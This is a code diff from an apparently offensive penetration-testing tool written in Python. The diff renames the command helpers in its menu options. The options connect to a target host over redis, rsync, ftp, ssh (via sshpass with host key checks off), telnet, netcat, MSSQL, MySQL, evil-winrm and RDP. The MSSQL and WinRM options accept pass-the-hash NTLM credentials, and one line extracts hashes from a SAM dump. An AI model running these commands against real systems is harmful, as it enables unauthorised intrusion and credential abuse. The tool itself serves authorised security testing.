+               runCommand("cut -f4 -d':' ./" + workDir + "/sam-extract.sam > " + dataDir + "/hashes.txt")  
          print("[+] Importing extracted secrets...")         
          with open(dataDir + "/usernames.txt", "r") as read1, open(dataDir + "/hashes.txt", "r") as read2:
            for x in range (0, maxUser):
@@ -3740,7 +3614,7 @@ while True:
 # ------------------------------------------------------------------------------------- 
 
    if selection =='78':
-      remotCOM("redis-cli -h " + TIP.rstrip(" ") + " --pass " + PAS.rstrip(" "))
+      runCommand("redis-cli -h " + TIP.rstrip(" ") + " --pass " + PAS.rstrip(" "))
       prompt()
       
 # ------------------------------------------------------------------------------------- 
@@ -3758,7 +3632,7 @@ while True:
       if checkParams != 1:
          checkParams = test_TSH()               
       if checkParams != 1:
-         remotCOM("rsync -av rsync://" + TIP.rstrip(" ") +  ":873/" + TSH.rstrip(" ") + " " + TSH.rstrip(" "))
+         runCommand("rsync -av rsync://" + TIP.rstrip(" ") +  ":873/" + TSH.rstrip(" ") + " " + TSH.rstrip(" "))
       prompt()
       
 # ------------------------------------------------------------------------------------- 
@@ -3774,7 +3648,7 @@ while True:
       if checkParams != 1:
          checkParams = test_PRT("873")         
       if checkParams != 1:
-         remotCOM("rsync -a rsync://" + TIP.rstrip(" ") +  ":873")  
+         runCommand("rsync -a rsync://" + TIP.rstrip(" ") +  ":873")  
       prompt()
       
 # ------------------------------------------------------------------------------------- 
@@ -3790,7 +3664,7 @@ while True:
       if checkParams != 1:
          checkParams = test_PRT("21")                 
       if checkParams != 1:
-         remotCOM("ftp " + TIP.rstrip(" ") + " 21")
+         runCommand("ftp " + TIP.rstrip(" ") + " 21")
       prompt()       
       
 # ------------------------------------------------------------------------------------- 
@@ -3806,7 +3680,7 @@ while True:
       if checkParams != 1:
          checkParams = test_PRT("22")                 
       if checkParams != 1:
-         remotCOM("sshpass -p '" + PAS.rstrip(" ") + "' ssh -o 'StrictHostKeyChecking no' " + USR.rstrip(" ") + "@" + TIP.rstrip(" "))
+         runCommand("sshpass -p '" + PAS.rstrip(" ") + "' ssh -o 'StrictHostKeyChecking no' " + USR.rstrip(" ") + "@" + TIP.rstrip(" "))
       prompt() 
 
 # ------------------------------------------------------------------------------------- 
@@ -3822,7 +3696,7 @@ while True:
       if checkParams != 1:
          checkParams = test_PRT("22")          
       if checkParams != 1:
-         remotCOM("ssh -i id_rsa " + USR.rstrip(" ") + "@" + TIP.rstrip(" ") + " -p 22")
+         runCommand("ssh -i id_rsa " + USR.rstrip(" ") + "@" + TIP.rstrip(" ") + " -p 22")
       prompt()
       
 # ------------------------------------------------------------------------------------- 
@@ -3838,7 +3712,7 @@ while True:
       if checkParams != 1:
          checkParams = getPort()
       if checkParams != 1:
-         remotCOM("telnet -l " + USR.rstrip(" ") + " " + TIP.rstrip(" ") + " " + checkParams)
+         runCommand("telnet -l " + USR.rstrip(" ") + " " + TIP.rstrip(" ") + " " + checkParams)
       prompt()
       
 # ------------------------------------------------------------------------------------- 
@@ -3854,7 +3728,7 @@ while True:
       if checkParams != 1:
          checkParams = getPort()               
       if checkParams != 1:
-         remotCOM("nc " + TIP.rstrip(" ") + " " + checkParams)
+         runCommand("nc " + TIP.rstrip(" ") + " " + checkParams)
       prompt()
 
 # ------------------------------------------------------------------------------------- 
@@ -3871,11 +3745,11 @@ while True:
          checkParams = test_PRT("1433")               
       if checkParams != 1:
          if PAS[:1] != " ":
-            remotCOM(keyPath + "mssqlclient.py " + DOM.rstrip(" ") + "/" + USR.rstrip(" ") + "@" + TIP.rstrip(" ") + " -windows-auth")
+            runCommand(keyPath + "mssqlclient.py " + DOM.rstrip(" ") + "/" + USR.rstrip(" ") + "@" + TIP.rstrip(" ") + " -windows-auth")
          else:
             if NTM[:1] != " ":
                print("[i] Using HASH value as password credential...")
-               remotCOM(keyPath + "mssqlclient.py " + DOM.rstrip(" ") + "/" + USR.rstrip(" ") + "@" + TIP.rstrip(" ") + " -hashes " + NTM.rstrip(" ") + " -windows-auth")
+               runCommand(keyPath + "mssqlclient.py " + DOM.rstrip(" ") + "/" + USR.rstrip(" ") + "@" + TIP.rstrip(" ") + " -hashes " + NTM.rstrip(" ") + " -windows-auth")
       prompt()
 
 # ------------------------------------------------------------------------------------- 
@@ -3891,7 +3765,7 @@ while True:
       if checkParams != 1:
          checkParams = test_PRT("3306")            
       if checkParams != 1:
-         remotCOM("mysql -u " + USR.rstrip(" ") + " -p '" + PAS.rstrip(" ") + "' -h " + TIP.rstrip(" "))
+         runCommand("mysql -u " + USR.rstrip(" ") + " -p '" + PAS.rstrip(" ") + "' -h " + TIP.rstrip(" "))
       prompt() 
 
 # ------------------------------------------------------------------------------------- 
@@ -3913,14 +3787,14 @@ while True:
          if NTM[:5] != "EMPTY":
             print("[i] Using the HASH value as a password credential...")
             if IP46 == "-4":
-               remotCOM("evil-winrm -i " + TIP.rstrip(" ") + " -u " + USR.rstrip(" ") + " -H " + NTM.rstrip(" ") + "  -s './" + powrDir + "/' -e './" + httpDir + "/'")
+               runCommand("evil-winrm -i " + TIP.rstrip(" ") + " -u " + USR.rstrip(" ") + " -H " + NTM.rstrip(" ") + "  -s './" + powrDir + "/' -e './" + httpDir + "/'")
             else:
-               remotCOM("evil-winrm -i " + DOM.rstrip(" ") + " -u " + USR.rstrip(" ") + " -H " + NTM.rstrip(" ") + "  -s './" + powrDir + "/' -e './" + httpDir + "/'")
+               runCommand("evil-winrm -i " + DOM.rstrip(" ") + " -u " + USR.rstrip(" ") + " -H " + NTM.rstrip(" ") + "  -s './" + powrDir + "/' -e './" + httpDir + "/'")
          else:
             if IP46 == "-4":
-               remotCOM("evil-winrm -i " + TIP.rstrip(" ") + " -u " + USR.rstrip(" ") + " -p '" + PAS.rstrip(" ") + "' -s './" + powrDir + "/' -e './" + httpDir + "/'")            
+               runCommand("evil-winrm -i " + TIP.rstrip(" ") + " -u " + USR.rstrip(" ") + " -p '" + PAS.rstrip(" ") + "' -s './" + powrDir + "/' -e './" + httpDir + "/'")            
             else:
-               remotCOM("evil-winrm -i " + DOM.rstrip(" ") + " -u " + USR.rstrip(" ") + " -p '" + PAS.rstrip(" ") + "' -s './" + powrDir + "/' -e './" + httpDir + "/'")
+               runCommand("evil-winrm -i " + DOM.rstrip(" ") + " -u " + USR.rstrip(" ") + " -p '" + PAS.rstrip(" ") + "' -s './" + powrDir + "/' -e './" + httpDir + "/'")
       prompt()
 
 # ------------------------------------------------------------------------------------- 
@@ -3936,7 +3810,7 @@ while True:
       if checkParams != 1:
          checkParams = test_PRT("3389")                     
       if checkParams != 1:
-         remotCOM("xfreerdp -sec-nla /u:" + USR.rstrip(" ") + " /p:" + PAS.rstrip(" ") + " /v:" + TIP.rstrip(" "))
+         runCommand("xfreerdp -sec-nla /u:" + USR.rstrip(" ") + " /p:" + PAS.rstrip(" ") + " /v:" + TIP.rstrip(" "))
       prompt()             
                  
 # ------------------------------------------------------------------------------------- 
@@ -3949,13 +3823,13 @@ while True:
 
    if selection == '90':        
       saveParams()
-      localCOM("rm *.tmp")      
+      runCommand("rm *.tmp")      
       if DOMC == 1:
          print("[+] Removing domain name from /etc/hosts...")
-         localCOM("sed -i '$d' /etc/hosts")         
+         runCommand("sed -i '$d' /etc/hosts")         
       if DNSC == 1:
          print("[+] Removing dns server from /etc/resolv.conf...")
-         localCOM("sed -i '$d' /etc/resolv.conf")         
+         runCommand("sed -i '$d' /etc/resolv.conf")         
       connection.close()
       print(colored("[*] Program sucessfully terminated...", colour3))
       exit(1)        
